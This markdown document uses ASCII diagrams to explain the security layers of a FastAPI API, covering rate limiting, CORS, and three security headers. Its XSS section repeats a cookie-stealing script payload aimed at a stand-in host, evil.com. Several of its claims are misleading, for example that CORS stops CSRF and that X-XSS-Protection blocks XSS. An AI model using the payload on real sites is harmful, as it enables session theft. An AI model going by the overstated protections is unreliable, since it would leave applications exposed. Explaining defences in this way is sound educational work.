# Security Features - Visual Diagrams

## Rate Limiting Flow

### Normal Request (Within Limit)

```
User makes request #1
    │
    ├─► POST /auth/login
    │
    ▼
Rate Limiter checks
    │
    ├─► IP: 192.168.1.100
    ├─► Count: 1/5 (within limit)
    │
    ▼
Request processed
    │
    ├─► Login logic executes
    │
    ▼
Response: 200 OK
```

### Rate Limit Exceeded

```
User makes request #6
    │
    ├─► POST /auth/login
    │
    ▼
Rate Limiter checks
    │
    ├─► IP: 192.168.1.100
    ├─► Count: 6/5 (EXCEEDED!)
    │
    ▼
Request blocked
    │
    ├─► Return 429 error
    │
    ▼
Response: 429 Too Many Requests
{
  "error": "Rate limit exceeded: 5 per 1 minute"
}
```

### Rate Limit Reset

```
Time: 0:00 - User makes 5 requests ✅
Time: 0:30 - User makes 6th request ❌ (blocked)
Time: 1:00 - Counter resets to 0
Time: 1:01 - User can make requests again ✅
```

---

## CORS Protection Flow

### Allowed Origin (Mobile App)

```
┌──────────────────┐                    ┌──────────────────┐
│  Mobile App      │                    │  FastAPI Server  │
│  localhost:8081  │                    │  localhost:8000  │
└────────┬─────────┘                    └────────┬─────────┘
         │                                       │
         │  1. Request                           │
         │  Origin: http://localhost:8081        │
         ├──────────────────────────────────────►│
         │                                       │
         │                                       │ 2. Check allow_origins
         │                                       │    ✅ ALLOWED
         │                                       │
         │  3. Response with CORS headers        │
         │  Access-Control-Allow-Origin:         │
         │  http://localhost:8081                │
         │◄──────────────────────────────────────┤
         │                                       │
         │  4. Request succeeds ✅               │
         │                                       │
```

### Blocked Origin (Malicious Site)

```
┌──────────────────┐                    ┌──────────────────┐
│  Malicious Site  │                    │  FastAPI Server  │
│  evil.com        │                    │  localhost:8000  │
└────────┬─────────┘                    └────────┬─────────┘
         │                                       │
         │  1. Request                           │
         │  Origin: http://evil.com              │
         ├──────────────────────────────────────►│
         │                                       │
         │                                       │ 2. Check allow_origins
         │                                       │    ❌ NOT ALLOWED
         │                                       │
         │  3. Response WITHOUT CORS headers     │
         │◄──────────────────────────────────────┤
         │                                       │
         │  4. Browser blocks response ❌        │
         │                                       │
```

---

## Security Headers Protection

### X-Content-Type-Options: nosniff

#### Without nosniff (Vulnerable)

```
1. Attacker uploads file
   │
   ├─► Filename: innocent.jpg
   ├─► Content: <script>alert('Hacked!')</script>
   │
   ▼
2. Server stores file
   │
   ├─► Content-Type: image/jpeg
   │
   ▼
3. User requests file
   │
   ├─► GET /uploads/innocent.jpg
   │
   ▼
4. Browser receives file
   │
   ├─► Sees Content-Type: image/jpeg
   ├─► But detects JavaScript inside
   ├─► MIME-sniffs and executes as JavaScript
   │
   ▼
5. Malicious script runs ❌
   │
   └─► User's data stolen
```

#### With nosniff (Protected)

```
1. Attacker uploads file
   │
   ├─► Filename: innocent.jpg
   ├─► Content: <script>alert('Hacked!')</script>
   │
   ▼
2. Server stores file
   │
   ├─► Content-Type: image/jpeg
   │
   ▼
3. User requests file
   │
   ├─► GET /uploads/innocent.jpg
   │
   ▼
4. Browser receives file
   │
   ├─► Sees Content-Type: image/jpeg
   ├─► Sees X-Content-Type-Options: nosniff
   ├─► Refuses to execute as JavaScript
   │
   ▼
5. File treated as image only ✅
   │
   └─► Attack blocked
```

---

### X-Frame-Options: DENY

#### Clickjacking Attack (Without Protection)

```
┌─────────────────────────────────────────────────────────────┐
│                    Attacker's Website                        │
│                    (evil.com)                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Invisible iframe (opacity: 0)                     │    │
│  │  ┌──────────────────────────────────────────────┐  │    │
│  │  │  Your Bank Website                           │  │    │
│  │  │  [Transfer Money Button]                     │  │    │
│  │  └──────────────────────────────────────────────┘  │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │  Visible fake button (positioned on top)          │    │
│  │  [Download Free Game]                              │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘

User clicks "Download Free Game"
    │
    ├─► Actually clicks "Transfer Money" in invisible iframe
    │
    ▼
Money transferred to attacker ❌
```

#### With X-Frame-Options: DENY (Protected)

```
┌─────────────────────────────────────────────────────────────┐
│                    Attacker's Website                        │
│                    (evil.com)                                │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  <iframe src="https://your-bank.com">                       │
│                                                              │
│  ┌────────────────────────────────────────────────────┐    │
│  │  ❌ Refused to display in iframe                   │    │
│  │                                                     │    │
│  │  X-Frame-Options: DENY                             │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘

Browser refuses to load site in iframe ✅
Attack blocked
```

---

### X-XSS-Protection: 1; mode=block

#### XSS Attack (Without Protection)

```
1. Attacker posts comment
   │
   ├─► Comment: <script>
   │            fetch('http://evil.com/steal?cookie=' + document.cookie)
   │            </script>
   │
   ▼
2. Comment stored in database
   │
   ├─► No sanitization
   │
   ▼
3. Other user views page
   │
   ├─► GET /comments
   │
   ▼
4. Server returns HTML with script
   │
   ├─► <div>
   │     <script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
   │   </div>
   │
   ▼
5. Browser executes script ❌
   │
   ├─► Sends user's cookies to attacker
   │
   ▼
6. Attacker steals session
   │
   └─► Can impersonate user
```

#### With XSS Protection (Protected)

```
1. Attacker posts comment
   │
   ├─► Comment: <script>
   │            fetch('http://evil.com/steal?cookie=' + document.cookie)
   │            </script>
   │
   ▼
2. Comment stored in database
   │
   ├─► No sanitization
   │
   ▼
3. Other user views page
   │
   ├─► GET /comments
   │
   ▼
4. Server returns HTML with script
   │
   ├─► X-XSS-Protection: 1; mode=block
   │
   ▼
5. Browser detects XSS
   │
   ├─► Suspicious script pattern detected
   ├─► Blocks page from loading
   │
   ▼
6. Page blocked ✅
   │
   ├─► Shows error message
   │
   └─► Attack prevented
```

---

## Complete Security Flow

```
┌─────────────────────────────────────────────────────────────┐
│                    Client Request                            │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              1. Rate Limiter Check                           │
│  • Check IP address                                          │
│  • Count requests in time window                             │
│  • If exceeded: Return 429                                   │
│  • If OK: Continue                                           │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              2. CORS Check                                   │
│  • Check Origin header                                       │
│  • If not in allow_origins: Block                            │
│  • If OK: Add CORS headers                                   │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              3. Route Handler                                │
│  • Execute business logic                                    │
│  • Query database                                            │
│  • Process request                                           │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│              4. Security Headers Middleware                  │
│  • Add X-Content-Type-Options: nosniff                       │
│  • Add X-Frame-Options: DENY                                 │
│  • Add X-XSS-Protection: 1; mode=block                       │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                    Response to Client                        │
│  • Status code                                               │
│  • Headers (CORS + Security)                                 │
│  • Body (JSON data)                                          │
└─────────────────────────────────────────────────────────────┘
```

---

## Attack Prevention Summary

```
┌─────────────────────────────────────────────────────────────┐
│                    Attack Vectors                            │
└─────────────────────────────────────────────────────────────┘

Brute Force Attack
    │
    ├─► Attacker tries many passwords
    │
    ▼
    ✅ Blocked by Rate Limiting (5/minute)


CSRF Attack
    │
    ├─► Malicious site makes requests
    │
    ▼
    ✅ Blocked by CORS Restriction


Clickjacking
    │
    ├─► Attacker embeds site in iframe
    │
    ▼
    ✅ Blocked by X-Frame-Options: DENY


XSS Attack
    │
    ├─► Attacker injects malicious script
    │
    ▼
    ✅ Blocked by X-XSS-Protection


MIME-Sniffing Attack
    │
    ├─► Attacker uploads malicious file
    │
    ▼
    ✅ Blocked by X-Content-Type-Options: nosniff


Spam Account Creation
    │
    ├─► Attacker creates many fake accounts
    │
    ▼
    ✅ Blocked by Rate Limiting (3/minute)
```

---

## Security Layers

```
┌─────────────────────────────────────────────────────────────┐
│                    Defense in Depth                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Layer 1: Rate Limiting                                     │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Limits requests per IP                          │    │
│  │  • Prevents brute force                            │    │
│  │  • Prevents spam                                   │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
│  Layer 2: CORS Restriction                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Only allows specific origins                    │    │
│  │  • Prevents CSRF attacks                           │    │
│  │  • Protects API access                             │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
│  Layer 3: Security Headers                                  │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • nosniff: Prevents MIME-sniffing                 │    │
│  │  • DENY: Prevents clickjacking                     │    │
│  │  • XSS Protection: Blocks malicious scripts        │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
│  Layer 4: Input Validation (Future)                         │
│  ┌────────────────────────────────────────────────────┐    │
│  │  • Validate all user input                         │    │
│  │  • Sanitize data                                   │    │
│  │  • Prevent SQL injection                           │    │
│  └────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Summary

These diagrams illustrate:

1. **Rate Limiting** - Prevents brute force and spam
2. **CORS Protection** - Blocks unauthorized origins
3. **Security Headers** - Multiple attack prevention
4. **Defense in Depth** - Layered security approach

All working together to protect your API!
